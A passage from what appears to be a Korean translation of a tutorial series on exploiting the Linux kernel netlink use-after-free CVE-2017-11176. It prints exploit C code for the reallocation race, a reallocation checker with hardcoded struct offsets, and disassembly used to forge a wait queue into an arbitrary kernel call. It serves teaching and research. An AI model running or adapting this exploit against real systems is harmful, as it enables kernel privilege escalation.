    perror("[-] sendmsg");
    goto fail;
  }

  return NULL;

fail:
  printf("[-] REALLOC THREAD FAILURE!!!\n");
  return NULL;
}
```

재할당스레드는 메인 스레드가 **realloc\_NOW()**로 재할당을 지시할 때까지 **g\_realloc\_now**로 *spinlock*될 것이다:

```c
// keep this inlined, we can't loose any time (critical path)
static inline __attribute__((always_inline)) void realloc_NOW(void)
{
  g_realloc_now = 1;
  _sched_yield(); // don't run me, run the reallocator threads!
  sleep(5);
}
```

**sched\_yield()** syscall은 메인 스레드가 선점되도록(preempted) 강제한다. 다행히 다음 차례의 스케쥴은 우리가 재할당한 스레드 중 하나일 것이고, 재할당 race를 이기게 된다.

마지막으로 **main()** 코드는 다음과 같이 된다:

```c
int main(void)
{
  int sock_fd  = -1;
  int sock_fd2 = -1;
  int unblock_fd = 1;
  struct realloc_thread_arg rta[NB_REALLOC_THREADS];

  printf("[ ] -={ CVE-2017-11176 Exploit }=-\n");

  if (migrate_to_cpu0())
  {
    printf("[-] failed to migrate to CPU#0\n");
    goto fail;
  }
  printf("[+] successfully migrated to CPU#0\n");

  memset(rta, 0, sizeof(rta));
  if (init_reallocation(rta, NB_REALLOC_THREADS))
  {
    printf("[-] failed to initialize reallocation!\n");
    goto fail;
  }
  printf("[+] reallocation ready!\n");

  if ((sock_fd = prepare_blocking_socket()) < 0)
    goto fail;
  printf("[+] netlink socket created = %d\n", sock_fd);

  if (((unblock_fd = _dup(sock_fd)) < 0) || ((sock_fd2 = _dup(sock_fd)) < 0))
  {
    perror("[-] dup");
    goto fail;
  }
  printf("[+] netlink fd duplicated (unblock_fd=%d, sock_fd2=%d)\n", unblock_fd, sock_fd2);

  // trigger the bug twice AND immediatly realloc!
  if (decrease_sock_refcounter(sock_fd, unblock_fd) ||
      decrease_sock_refcounter(sock_fd2, unblock_fd))
  {
    goto fail;
  }
  realloc_NOW();

  printf("[ ] ready to crash?\n");
  PRESS_KEY();

  close(unblock_fd);

  printf("[ ] are we still alive ?\n");
  PRESS_KEY();

  // TODO: exploit

  return 0;

fail:
  printf("[-] exploit failed!\n");
  PRESS_KEY();
  return -1;
}
```

익스플로잇을 당장 돌려봐도 되지만 별 효과는 없을 것이다. 아직도 *netlink\_release()*에서 무작위로 크래시가 나는데, 이는 다음 섹션에서 해결할 것이다.

- - -

## Exploit (Arbitrary Call)

"*뜻이 있는 곳에 길이 있다*"

이전 섹션에서 우리는:

* *재할당*과 *type confusion*의 기본적인 내용을 배웠다
* 우리의 UAF에 대한 정보를 모으로 dangling pointer들을 찾았다
* UAF를 원할 때 트리거/제어할 수 있다는 것을 알았다
* 재할당을 구현했다!

이제 이걸 전부 합쳐 UAF를 익스플로잇할 시간이다. 다음을 명심하자:

**궁극적인 목표는 *커널 실행 흐름*을 장악하는 것이다.**

커널 실행 흐름을 좌우하는 것은 무엇인가? 다른 어떤 프로그램처럼, 인스트럭션 포인터인 RIP (amd64) 혹은 PC (arm)이다. 

[Core Concepts #1]()에서 본 것처럼 커널은 *Virtual Function Table (VFT)*와 genericity를 얻기 위한 **function pointer**들로 가득하다. 이것이 우리가 여기서 할 것이다.

- - -

### The Primitive Gates

우리의 *UAF primitive*로 돌아가보자. 이전 섹션에서, **close(unblock\_fd)**를 호출하여 UAF를 제어(혹은 트리거)할 수 있다는 것과 *struct socket*의 **sk** 필드가 dangling pointer인 걸 알았다. 둘 사이의 연결고리는 VFT이다:

* *struct file\_operations **socket\_file\_ops***: *close* syscall을 *sock\_close()*에
* *struct proto\_ops **netlink\_ops***: *sock\_close()*를 *netlink\_release()*에

**이 VFT들은 우리의 primitive gate이다. 모든 단일 *UAF primitive*는 이런 함수 포인터로부터 시작한다.**

그러나 이들 포인터를 직접적으로 제어할 순 없다. 이유는 free된 구조체가 *struct netlink\_sock*이기 때문이다. 대신 이 VFT들에 대한 포인터는 각각 *struct file*과 *struct socket*에 저장된다. 우린 이 VFT들에서 제공해준 primitive를 익스플로잇할 것이다.

예를 들어 다음 call trace(꽤 직관적이다)를 통해 도달할 수 있는 (*netlink\_ops*에서 나온) **netlink\_getname()**을 보자:

```plaintext
- SYSCALL_DEFINE3(getsockname, ...) // calls sock->ops->getname()
- netlink_getname()
```

```c
static int netlink_getname(struct socket *sock, struct sockaddr *addr,
               int *addr_len, int peer)
{
    struct sock *sk = sock->sk;                                 // <----- DANGLING POINTER
    struct netlink_sock *nlk = nlk_sk(sk);                      // <----- DANGLING POINTER
    struct sockaddr_nl *nladdr = (struct sockaddr_nl *)addr;    // <----- will be transmitted to userland

    nladdr->nl_family = AF_NETLINK;
    nladdr->nl_pad = 0;
    *addr_len = sizeof(*nladdr);

    if (peer) {                                                 // <----- set to zero by getsockname() syscall
        nladdr->nl_pid = nlk->dst_pid;
        nladdr->nl_groups = netlink_group_mask(nlk->dst_group);
    } else {
        nladdr->nl_pid = nlk->pid;                                // <----- uncontrolled read primitive
        nladdr->nl_groups = nlk->groups ? nlk->groups[0] : 0;     // <----- uncontrolled read primitive
    }
    return 0;
}
```

**😲! 이것은 훌륭한 "uncontrolled read primitive"(read가 둘 있고 부작용이 없음)이다. 이를 이용해 재할당이 성공했는지를 감지하고 익스플로잇의 확실성을 높일 것이다.**

### Reallocation Checker Implementation

앞의 primitive를 다뤄서 재할당이 성공했는지 체크해보자! 어떻게 해야 할까? 이것이 계획이다:

1. *nlk->pid*와 *nlk->groups*의 **정확한 오프셋**을 찾는다
2. 우리의 "재할당 data 공간"에 어떤 magic value를 쓴다(= *init\_realloc\_data()*).
3. **getsockname()** syscall을 호출하여 반환되는 값을 체크한다.

반환되는 주소가 우리의 magic value와 일치한다면 재할당이 성공한 것이고 우리의 첫 *UAF primitive* (uncontrolled read)를 익스플로잇한 것이다! 재할당이 되었는지를 매번 검증하지는 않아도 된다.

*nlk->pid*와 *nlk->groups*의 오프셋을 찾기 위해 일단 압축되지 않은 형식의 바이너리가 필요하다. 어떻게 하는지 모른다면 이 [링크](https://blog.packagecloud.io/eng/2016/03/08/how-to-extract-and-disassmble-a-linux-kernel-image-vmlinuz/)를 확인하라. 또한 **"/boot/System.map-$(uname -r)"** 파일을 얻어야 한다. 만약 (모종의 이유로) 이 파일에 접근할 수 없다면 같은 결과를 주는 **"/proc/kallsyms"**를 확인해보자(루트 권한 필요).

좋다. 이제 커널을 디스어셈블할 준비가 되었다. 리눅스 커널은 근본적으로 **ELF 바이너리**이다. 그러므로 **objdump**같은 클래식한 *binutils*를 사용할 수 있다.

우린 **netlink\_getname()**에서 사용되는 *nlk->pid*와 *nlk->groups*의 **정확한 오프셋**을 알고 싶다. 디스어셈블해보자!우선 *System.map* 파일을 통해 *netlink\_getname()*의 주소를 찾는다:

```bash
$ grep "netlink_getname" System.map-2.6.32
ffffffff814b6ea0 t netlink_getname
```

우리의 경우에 *netlink\_getname()* 함수는 *0xffffffff814b6ea0*에 로딩될 것이다.

**노트**: KASLR은 비활성화됐다고 가정한다.

다음으로, vmlinux(vmlinuZ가 아니다!)를 열고 디스어셈블리 툴을 통해 *netlink\_getname()* 함수를 분석해보자:

```plaintext
ffffffff814b6ea0:       55                      push   rbp
ffffffff814b6ea1:       48 89 e5                mov    rbp,rsp
ffffffff814b6ea4:       e8 97 3f b5 ff          call   0xffffffff8100ae40
ffffffff814b6ea9:       48 8b 47 38             mov    rax,QWORD PTR [rdi+0x38]
ffffffff814b6ead:       85 c9                   test   ecx,ecx
ffffffff814b6eaf:       66 c7 06 10 00          mov    WORD PTR [rsi],0x10
ffffffff814b6eb4:       66 c7 46 02 00 00       mov    WORD PTR [rsi+0x2],0x0
ffffffff814b6eba:       c7 02 0c 00 00 00       mov    DWORD PTR [rdx],0xc
ffffffff814b6ec0:       74 26                   je     0xffffffff814b6ee8
ffffffff814b6ec2:       8b 90 8c 02 00 00       mov    edx,DWORD PTR [rax+0x28c]
ffffffff814b6ec8:       89 56 04                mov    DWORD PTR [rsi+0x4],edx
ffffffff814b6ecb:       8b 88 90 02 00 00       mov    ecx,DWORD PTR [rax+0x290]
ffffffff814b6ed1:       31 c0                   xor    eax,eax
ffffffff814b6ed3:       85 c9                   test   ecx,ecx
ffffffff814b6ed5:       74 07                   je     0xffffffff814b6ede
ffffffff814b6ed7:       83 e9 01                sub    ecx,0x1
ffffffff814b6eda:       b0 01                   mov    al,0x1
ffffffff814b6edc:       d3 e0                   shl    eax,cl
ffffffff814b6ede:       89 46 08                mov    DWORD PTR [rsi+0x8],eax
ffffffff814b6ee1:       31 c0                   xor    eax,eax
ffffffff814b6ee3:       c9                      leave  
ffffffff814b6ee4:       c3                      ret    
ffffffff814b6ee5:       0f 1f 00                nop    DWORD PTR [rax]
ffffffff814b6ee8:       8b 90 88 02 00 00       mov    edx,DWORD PTR [rax+0x288]
ffffffff814b6eee:       89 56 04                mov    DWORD PTR [rsi+0x4],edx
ffffffff814b6ef1:       48 8b 90 a0 02 00 00    mov    rdx,QWORD PTR [rax+0x2a0]
ffffffff814b6ef8:       31 c0                   xor    eax,eax
ffffffff814b6efa:       48 85 d2                test   rdx,rdx
ffffffff814b6efd:       74 df                   je     0xffffffff814b6ede
ffffffff814b6eff:       8b 02                   mov    eax,DWORD PTR [rdx]
ffffffff814b6f01:       89 46 08                mov    DWORD PTR [rsi+0x8],eax
ffffffff814b6f04:       31 c0                   xor    eax,eax
ffffffff814b6f06:       c9                      leave  
ffffffff814b6f07:       c3                      ret    
```

이 어셈블리 코드를 부분별로 나눠 원래의 *netlink\_getname()* 함수와 대조해보자. **System V ABI**가 기억나지 않는다면 이 [링크](https://wiki.osdev.org/System_V_ABI)를 확인하자. 제일 중요한 것은 파라미터(여기선 4개)의 순서이다:

1. **rdi**: *struct socket \*sock*
2. **rsi**: *struct sockaddr \*addr*
3. **rdx**: *int \*addr\_len*
4. **rcx**: *int peer*

시작해보자. 먼저 *프롤로그*가 있다. *0xffffffff8100ae40*에 대한 호출은 no-op이다(디스어셈블리를 보라):

```asm
ffffffff814b6ea0:       55                      push   rbp
ffffffff814b6ea1:       48 89 e5                mov    rbp,rsp
ffffffff814b6ea4:       e8 97 3f b5 ff          call   0xffffffff8100ae40   // <---- NOP
```

다음은 *netlink\_getname()*의 *일반적인*(common) 부분이다:

```asm
ffffffff814b6ea9:       48 8b 47 38             mov    rax,QWORD PTR [rdi+0x38] // retrieve "sk"
ffffffff814b6ead:       85 c9                   test   ecx,ecx                  // test "peer" value
ffffffff814b6eaf:       66 c7 06 10 00          mov    WORD PTR [rsi],0x10      // set "AF_NETLINK"
ffffffff814b6eb4:       66 c7 46 02 00 00       mov    WORD PTR [rsi+0x2],0x0   // set "nl_pad"
ffffffff814b6eba:       c7 02 0c 00 00 00       mov    DWORD PTR [rdx],0xc      // sizeof(*nladdr)
```

그리고 *peer* 값에 따라 갈라진다:

```asm
ffffffff814b6ec0:       74 26                   je     0xffffffff814b6ee8 // "if (peer)"
```

만약 "peer"가 0이 아니라면(우리의 경우), 마지막 부분을 제외하곤 전부 무시하면 된다:

```asm
ffffffff814b6ec2:       8b 90 8c 02 00 00       mov    edx,DWORD PTR [rax+0x28c]    // ignore
ffffffff814b6ec8:       89 56 04                mov    DWORD PTR [rsi+0x4],edx      // ignore
ffffffff814b6ecb:       8b 88 90 02 00 00       mov    ecx,DWORD PTR [rax+0x290]    // ignore
ffffffff814b6ed1:       31 c0                   xor    eax,eax                      // ignore
ffffffff814b6ed3:       85 c9                   test   ecx,ecx                      // ignore
ffffffff814b6ed5:       74 07                   je     0xffffffff814b6ede           // ignore
ffffffff814b6ed7:       83 e9 01                sub    ecx,0x1                      // ignore
ffffffff814b6eda:       b0 01                   mov    al,0x1                       // ignore
ffffffff814b6edc:       d3 e0                   shl    eax,cl                       // ignore
ffffffff814b6ede:       89 46 08                mov    DWORD PTR [rsi+0x8],eax      // set "nladdr->nl_groups"
ffffffff814b6ee1:       31 c0                   xor    eax,eax                      // return code == 0
ffffffff814b6ee3:       c9                      leave  
ffffffff814b6ee4:       c3                      ret    
ffffffff814b6ee5:       0f 1f 00                nop    DWORD PTR [rax]
```

이런 간단한 블록을 남겨주며, 다음 코드로 이어진다(?):

```asm
ffffffff814b6ee8:       8b 90 88 02 00 00       mov    edx,DWORD PTR [rax+0x288]  // retrieve "nlk->pid"
ffffffff814b6eee:       89 56 04                mov    DWORD PTR [rsi+0x4],edx    // give it to "nladdr->nl_pid"
ffffffff814b6ef1:       48 8b 90 a0 02 00 00    mov    rdx,QWORD PTR [rax+0x2a0]  // retrieve "nlk->groups"
ffffffff814b6ef8:       31 c0                   xor    eax,eax
ffffffff814b6efa:       48 85 d2                test   rdx,rdx                    // test if "nlk->groups" it not NULL
ffffffff814b6efd:       74 df                   je     0xffffffff814b6ede         // if so, set "nl_groups" to zero
ffffffff814b6eff:       8b 02                   mov    eax,DWORD PTR [rdx]        // otherwise, deref first value of "nlk->groups"
ffffffff814b6f01:       89 46 08                mov    DWORD PTR [rsi+0x8],eax    // ...and put it into "nladdr->nl_groups"
ffffffff814b6f04:       31 c0                   xor    eax,eax                    // return code == 0
ffffffff814b6f06:       c9                      leave  
ffffffff814b6f07:       c3                      ret    
```

좋다, 이제 필요한 건 다 있다:

* *nlk->pid*의 **오프셋**은 "struct netlink\_sock"에서 **0x288**이다
* *nlk->groups*의 **오프셋**은 "struct netlink\_sock"에서 **0x2a0**이다

재할당이 성공했는지 알아보기 위해 **pid** 값을 "0x11a5dcee"(임의의 값)로 설정하고 "groups" 값을 0으로 설정한다(0이 아니면 역참조된다). 우리의 *arbitrary data array*(= *g\_realloc\_data*)에서 이 값들을 설정해보자:

```c
#define MAGIC_NL_PID 0x11a5dcee
#define MAGIC_NL_GROUPS 0x0

// target specific offset
#define NLK_PID_OFFSET      0x288
#define NLK_GROUPS_OFFSET   0x2a0

static int init_realloc_data(void)
{
  struct cmsghdr *first;
  int* pid = (int*)&g_realloc_data[NLK_PID_OFFSET];
  void** groups = (void**)&g_realloc_data[NLK_GROUPS_OFFSET];

  memset((void*)g_realloc_data, 'A', sizeof(g_realloc_data));

  // necessary to pass checks in __scm_send()
  first = (struct cmsghdr*) &g_realloc_data;
  first->cmsg_len = sizeof(g_realloc_data);
  first->cmsg_level = 0; // must be different than SOL_SOCKET=1 to "skip" cmsg
  first->cmsg_type = 1; // <---- ARBITRARY VALUE

  *pid = MAGIC_NL_PID;
  *groups = MAGIC_NL_GROUPS;

  // TODO: do something useful will the remaining bytes (i.e. arbitrary call)

  return 0;
}
```

재할당 데이터 레이아웃은 다음처럼 된다:

![Reallocation Checker Layout](https://blog.lexfo.fr/images/cve-2017-11176-linux/realloc_checker.png)

그런 다음 *getsockname()*(= *netlink\_getname()*)을 통해 값을 얻는지 검사한다:

```c
static bool check_realloc_succeed(int sock_fd, int magic_pid, unsigned long magic_groups)
{
  struct sockaddr_nl addr;
  size_t addr_len = sizeof(addr);

  memset(&addr, 0, sizeof(addr));
  // this will invoke "netlink_getname()" (uncontrolled read)
  if (_getsockname(sock_fd, &addr, &addr_len))
  {
    perror("[-] getsockname");
    goto fail;
  }
  printf("[ ] addr_len = %lu\n", addr_len);
  printf("[ ] addr.nl_pid = %d\n", addr.nl_pid);
  printf("[ ] magic_pid = %d\n", magic_pid);

  if (addr.nl_pid != magic_pid)
  {
    printf("[-] magic PID does not match!\n");
    goto fail;
  }

  if (addr.nl_groups != magic_groups) 
  {
    printf("[-] groups pointer does not match!\n");
    goto fail;
  }

  return true;

fail:
  return false;
}
```

마지막으로 이걸 *main()*에서 실행한다:

```c
int main(void)
{
  // ... cut ...

  realloc_NOW();

  if (!check_realloc_succeed(unblock_fd, MAGIC_NL_PID, MAGIC_NL_GROUPS))
  {
    printf("[-] reallocation failed!\n");
    // TODO: retry the exploit
    goto fail;
  }
  printf("[+] reallocation succeed! Have fun :-)\n");

  // ... cut ...
}
```

이제 익스플로잇을 다시 실행해보자. 재할당이 성공했다면 "[+] reallocation succeed! Have fun :-)"이라는 메시지가 보일 것이다. 안 보이면 재할당에 실패한 것이다! 익스플로잇을 재시도하여 재할당 실패를 건드려볼 수 있다(주의: 그냥 "재실행하는 것"만으론 부족하다). 이제부턴 크래시가 나는 것을 받아들일 것이다.

이번 섹션에선 우리의 가짜 "netlink\_sock" 구조체(= *g\_realloc\_data*)의 **pid** 필드를 이용한 *type confusion*을 시작했다. 또한 어떻게 *uncontrolled read primitive*를 (*netlink\_getname()*으로 끝나는) **getsockname()**으로 트리거하는지 보았다. 이제 UAF primitive에 더 익숙해졌을 것이다. 다음으로 넘어가서 arbitrary call을 얻어보자!

### Arbitrary Call Primitive

이제 *UAF primitive*가 어디 있고 어떻게 (file 그리고/혹은 소켓과 관련된 syscall을 통해) 도달하는지 이해했을 것이다. 다른 *dangling pointer*: **nl\_table**의 해시 리스트에서 나오는 primitive는 고려조차 하지 않았다. 이제 커널 실행 흐름을 장악한다는 목표에 도달할 시간이다.

커널 실행 흐름을 장악하려면 *arbitrary call primitive*가 필요하다. 말했던 것처럼 함수 포인터를 덮어씌워서 얻을 수가 있다. *struct netlink\_sock* 구조체가 가지고 있는 함수 포인터(FP)가 있는가?

```c
struct netlink_sock {
    /* struct sock has to be the first member of netlink_sock */
    struct sock     sk;                                 // <----- lots of (in)direct FPs
    u32         pid;
    u32         dst_pid;
    u32         dst_group;
    u32         flags;
    u32         subscriptions;
    u32         ngroups;
    unsigned long       *groups;
    unsigned long       state;
    wait_queue_head_t   wait;                           // <----- indirect FP
    struct netlink_callback *cb;                      // <----- two FPs
    struct mutex        *cb_mutex;
    struct mutex        cb_def_mutex;
    void            (*netlink_rcv)(struct sk_buff *skb);    // <----- one FP
    struct module       *module;
};
```

😆!! 선택지가 많다😀. 좋은 *arbitrary call primitive*란 무엇인가? 그 조건은 다음과 같다:

* syscall로 *빠르게* 도달할 수 있다(= 적은 call trace)
* 호출되면 *빠르게* syscall에서 나간다(= arbitrary call "이후"에 코드가 없음)
* 많은 검사를 통과하지 않고 도달 가능하다
* 커널 데이터 구조에 부작용을 끼치지 않는다

제일 분명한 첫 번째 방법은 **netlink\_rcv** 함수 포인터 대신 임의의 값을 넣는 것이다. 이 함수 포인터는 *netlink\_unicast\_kernel()*에 의해 실행된다. 그러나 이 primitive를 이용하면 좀 지루해진다. 특히 통과할 검사도 많고 구조체에 부작용을 불러일으킨다. 두 번째로 분명한 선택은 **netlink\_callback** 구조체 안의 함수 포인터이다. 이 함수 포인터도 도달하기에 복잡하며 부작용도 많고 통과할 검사가 많아 "좋은" call primitive가 아니다.

우리가 선택한 방법은 오랜 친구 **wait queue**를 사용하는 이다. 음..근데 함수 포인터가 없지 않은가?!

```c
struct __wait_queue_head {
    spinlock_t lock;
    struct list_head task_list;
};
typedef struct __wait_queue_head wait_queue_head_t;
```

맞는 말이다. 하지만 wait queue의 요소엔 함수 포인터가 있다. 즉 "간접적으로" 함수 포인터를 가지고 있는 것이다:

```c
typedef int (*wait_queue_func_t)(wait_queue_t *wait, unsigned mode, int flags, void *key);

struct __wait_queue {
    unsigned int flags;
#define WQ_FLAG_EXCLUSIVE   0x01
    void *private;
    wait_queue_func_t func;               // <------ this one!
    struct list_head task_list; 
};
```

게다가 우린 이 *func* 함수 포인터가 어디서 호출되고(*\_\_wake\_up\_common()*) 어떻게 도달하는지(*setsockopt()*) 알고 있다. 기억이 나지 않는다면 [part 2](https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html)로 돌아가라. 메인 스레드를 unblock하는 데 사용했던 방법이다.

**다시, 익스플로잇을 작성하는 덴 항상 여러 방법이 있다.** *최적의* 방법이 아닐 수 있음에도 이 방법을 선택한 이유는 독자가 이미 wait queue에 익숙하기 때문이다. 더 간단한 방법도 있겠지만 이 방법도 (적어도) 작동한다. 게다가 이 방법은 유저 영역에서 커널 구조체를 *모방하는*(mimic) 방법을 보여준다.

### Controlling Wait Queue Element

이전 섹션에서 wait queue를 이용하여 arbitrary call primitive를 얻는다고 했다. 그러나 wait queue 자체엔 함수 포인터가 없고 그 요소에 있었다. 그 함수 포인터에 도달하기 위해선 유저 영역에서 설정을 좀 해줘야 한다. 커널 구조체를 *모방해야* 한다.

**우리가 *kmalloc-1024* 오브젝트의 *wait* 오프셋의 데이터를 제어한다고 가정한다. 이는 *재할당*을 통해 이루어진다.**

*struct netlink\_sock*으로 돌아가보자. ***netlink\_sock* 안에** *wait* 필드가 **내장되어 있다**는 중요한 점을 기억하자. *wait*은 포인터가 아니다!

**주의**: 필드가 "내장되어" 있는지 "포인터"인지 유심히 보자(재확인하라!). 그게 버그와 실수의 원천이다.

*netlink\_sock* 구조체를 다음을 통해 재작성해보자:

```c
struct netlink_sock {
  // ... cut ...
    unsigned long       *groups;
    unsigned long       state;

  {                             // <----- wait_queue_head_t wait;
    spinlock_t lock;
    struct list_head task_list;
  }

    struct netlink_callback *cb;                      
  // ... cut ...
};
```

더 확장해보자. *spinlock\_t*는 실제로 "그저" unsigned int이고(CONFIG\_preprocessor에 신경 쓰며 정의를 확인하라), "struct list\_head"는 두 포인터를 가진 간단한 구조체이다:

```c
struct list_head {
    struct list_head *next, *prev;
};
```

즉 다음과 같다:

```c
struct netlink_sock {
  // ... cut ...
    unsigned long       *groups;
    unsigned long       state;

  {                             // <----- wait_queue_head_t wait;
    unsigned int slock;         // <----- ARBITRARY DATA HERE
                                // <----- padded or not ? check disassembly!
    struct list_head *next;     // <----- ARBITRARY DATA HERE
    struct list_head *prev;     // <----- ARBITRARY DATA HERE
  }

    struct netlink_callback *cb;                      
  // ... cut ...
};
```

재할당을 할 때 **slock**에서 몇 몇 특별한 값인 **next**와 **prev** 필드를 설정해야 한다. "어떤" 값인지 알기 위해, 모든 파라미터를 확장하며 **\_\_wake\_up\_common()**까지의 call trace를 상기해보자:

```plaintext
- SYSCALL(setsockopt)
- netlink_setsockopt(...)
- wake_up_interruptible(&nlk->wait)
- __wake_up_(&nlk->wait, TASK_INTERRUPTIBLE, 1, NULL)           // <----- deref "slock"
- __wake_up_common(&nlk->wait, TASK_INTERRUPTIBLE, 1, 0, NULL)
```

코드는 다음과 같다:

```c
      static void __wake_up_common(wait_queue_head_t *q, unsigned int mode,
            int nr_exclusive, int wake_flags, void *key)
      {
[0]     wait_queue_t *curr, *next;

[1]     list_for_each_entry_safe(curr, next, &q->task_list, task_list) {
[2]       unsigned flags = curr->flags;

[3]       if (curr->func(curr, mode, wake_flags, key) &&
[4]           (flags & WQ_FLAG_EXCLUSIVE) && !--nr_exclusive)
[5]         break;
        }
      }
```

이 함수는 이미 배웠다. 차이점은 이제 이 함수가 (정식(legitimate) wait queue 요소 대신) 재할당된 데이터를 다룬다는 것이다. 다음과 같은 일을 한다:

* [0] - **wait queue 요소**들에 대한 포인터를 선언
* [1] - 이중 연결 리스트 *task\_list*를 반복하여(iterate over) **curr**과 **next**를 설정
* [2] - 현재 wait queue 요소 *curr*의 *flag* 오프셋을 역참조
* [3] - **현재 요소의 함수 포인터 *func* 호출**
* [4] - *flag*의 WQ\_FLAG\_EXCLUSIVE 비트가 설정되어 있는지, 깨울 task가 더 없는지 검사
* [5] - 만약 그렇다면 break

궁극적으로 arbitrary call primitive가 실행되는 부분은 [3]이다.

**노트**: *list\_for\_each\_macro*를 아직 이해하지 못했다면 [Doubly Linked Circular List Usage]() 섹션으로 돌아가라.

요약해보자:

* wait queue 요소의 내용을 조정할 수 있으면 *func* 함수 포인터를 통해 *arbitrary call primitive*를 갖는다
* *가짜 struct netlink\_sock* 오브젝트를 제어된 데이터로 재할당할 것이다(type confusion)
* *netlink\_sock* 오브젝트는 wait queue 리스트의 head를 가지고 있다

즉 우리는 **wait\_queue\_head\_t(= *wait* field)의 *next*와 *prev* 필드를 덮어씌워 유저 영역을 가리키게** 만들 것이다. 다시, wait queue 요소(*curr*)는 유저 영역에 있을 것이다.

유저 영역을 가리킬 것이므로 wait queue 요소의 내용을 조정하여 arbitrary call을 할 수 있다. 그러나 *\_\_wake\_up\_common()*에 몇 가지 문제가 있다.

우선 *list\_for\_each\_entry\_safe()* 매크로를 다뤄야 한다:

```c
#define list_for_each_entry_safe(pos, n, head, member)          \
    for (pos = list_first_entry(head, typeof(*pos), member),    \
        n = list_next_entry(pos, member);           \
         &pos->member != (head);                    \
         pos = n, n = list_next_entry(n, member))
```

이중 연결 리스트가 원형이라는 것은 wait queue의 마지막 요소가 다시 리스트의 head(*&nlk->wait*)를 가리킨다는 것이다. 그렇지 않으면 *list\_for\_each\_entry()* 매크로가 루프에 빠지거나 나쁜 역참조를 하게 된다. 이걸 피해야 한다!

다행히도 ***break* 명령어 [5]에 도달한다면 루프를 멈출 수 있다**. 다음과 같은 조건에서 break에 도달 가능하다:

1. 호출된 임의의 함수가 0이 아닌 값을 반환하**고**
2. 유저 영역 wait queue 요소의 WQ\_FLAG\_EXCLUSIVE 비트가 설정되어 있**고**
3. *nr\_exclusive*가 0에 도달해야 한다

*nr\_exclusive* 인자는 *\_\_wake\_up\_common()* 실행 중엔 1로 설정된다. 즉 첫 arbitrary call 이후에 0으로 재설정된다. 유저 영역 wait queue 요소의 내용을 제어하고 있으므로 WQ\_FLAG\_EXCLUSIVE 비트를 설정하는 것은 쉽다. 마지막으로 (임의적으로) 호출된 함수의 반환 값에 대한 제약은 [part 4](https://chamalane.herokuapp.com/posts/5d50360ac040080004228198)에서 고려할 것이다. 지금은 0이 아닌 값을 반환하는 가젯을 사용한다고 가정하자. 이 파트에선 간단하게 반환을 하지 않고 좋은 stack trace를 출력하는(= 익스플로잇이 성공했는지 검증할 수 있는) **panic()**을 호출할 것이다.

다음으로, 우리가 list\_for\_each\_entry()의 "안전한" 버전을 사용하고 있으므로 **리스트의 두 번째 요소가 arbitrary call primitive 이전에 역참조될 것이다.**

즉 **유저 영역 wait queue 요소의 *next*와 *prev* 필드**에 적합한 값을 넣어줘야 한다. *&nlk->wait*의 값을 모르고(*dmesg*를 사용할 수 없다고 가정) [5]를 통해 루프를 멈출 수 있으므로 그냥 가짜 다음 wait queue 요소를 가리키도록 할 것이다.

**주의**: "가짜" 다음 요소는 *읽기 가능해야* 한다. 그렇지 않으면 나쁜 역참조(= *page fault*)로 인해 커널 크래시가 날 것이다. 이 내용은 [part 4](https://chamalane.herokuapp.com/posts/5d50360ac040080004228198)에서 더 자세히 설명한다.

이번 섹션에서 재할당된 *netlink\_sock* 오브젝트(= 유저 영역 wait queue 요소를 가리키는 포인터)의 *next* 필드와 *prev* 필드에 어떤 값이 들어가야 하는지 보았다. 다음으로 유저 영역 wait queue 요소에서 arbitrary call primitive에 접근하고 *list\_for\_each\_entry\_safe()* 매크로에서 제대로 빠져나오기 위한 선결 조건이 뭔지 보았다. 이제 구현할 차례다!

### Find Offsets

재할당 검증을 하며 했던 것처럼 *\_\_wake\_up\_common()*의 코드를 디스어셈블하여 여러 오프셋을 찾아보자. 먼저 *\_\_wake\_up\_common()*의 주소를 찾는다:

```bash
$ grep "__wake_up_common" System.map-2.6.32 
ffffffff810618b0 t __wake_up_common
```

ABI에 의하면 *\_\_wake\_up\_common()*은 다섯 가지 인자를 갖는다:

1. **rdi**: wait_queue_head_t \*q
2. **rsi**: unsigned int mode
3. **rdx**: int nr_exclusive
4. **rcx**: int wake_flags
5. **r8** : void \*key

함수는 프롤로그로 시작하여 스택에 파라미터들을 저장한다(몇 몇 레지스터가 사용 가능하게 만듦):

```asm
ffffffff810618c6:       89 75 cc                mov    DWORD PTR [rbp-0x34],esi // save 'mode' in the stack
ffffffff810618c9:       89 55 c8                mov    DWORD PTR [rbp-0x38],edx // save 'nr_exclusive' in the stack
```

그리고 **list\_for\_each\_entry\_safe** 매크로 초기화가 있다:

```asm
ffffffff810618cc:       4c 8d 6f 08             lea    r13,[rdi+0x8]            // store wait list head in R13
ffffffff810618d0:       48 8b 57 08             mov    rdx,QWORD PTR [rdi+0x8]  // pos = list_first_entry()
ffffffff810618d4:       41 89 cf                mov    r15d,ecx                 // store "wake_flags" in R15
ffffffff810618d7:       4d 89 c6                mov    r14,r8                   // store "key" in R14
ffffffff810618da:       48 8d 42 e8             lea    rax,[rdx-0x18]           // retrieve "curr" from "task_list"
ffffffff810618de:       49 39 d5                cmp    r13,rdx                  // test "pos != wait_head"
ffffffff810618e1:       48 8b 58 18             mov    rbx,QWORD PTR [rax+0x18] // save "task_list" in RBX
ffffffff810618e5:       74 3f                   je     0xffffffff81061926       // jump to exit
ffffffff810618e7:       48 83 eb 18             sub    rbx,0x18                 // RBX: current element
ffffffff810618eb:       eb 0a                   jmp    0xffffffff810618f7       // start looping!
ffffffff810618ed:       0f 1f 00                nop    DWORD PTR [rax]
```

"curr" 포인터를 갱신하고(첫 루프 무시) 루프 자체의 핵심으로(?) 코드가 시작된다(The code starts by updating the "curr" pointer (ignored during first loop) and then, the core of the loop itself):

```asm
ffffffff810618f0:       48 89 d8                mov    rax,rbx                  // set "currr" in RAX
ffffffff810618f3:       48 8d 5a e8             lea    rbx,[rdx-0x18]           // prepare "next" element in RBX
ffffffff810618f7:       44 8b 20                mov    r12d,DWORD PTR [rax]     // "flags = curr->flags"
ffffffff810618fa:       4c 89 f1                mov    rcx,r14                  // 4th argument "key"
ffffffff810618fd:       44 89 fa                mov    edx,r15d                 // 3nd argument "wake_flags"
ffffffff81061900:       8b 75 cc                mov    esi,DWORD PTR [rbp-0x34] // 2nd argument "mode"
ffffffff81061903:       48 89 c7                mov    rdi,rax                  // 1st argument "curr"
ffffffff81061906:       ff 50 10                call   QWORD PTR [rax+0x10]     // ARBITRARY CALL PRIMITIVE
```

"if()"의 모든 조건(statement)은 break할지 안 할지를 알기 위해 평가된다:

```asm
ffffffff81061909:       85 c0                   test   eax,eax                  // test "curr->func()" return code
ffffffff8106190b:       74 0c                   je     0xffffffff81061919       // goto next element
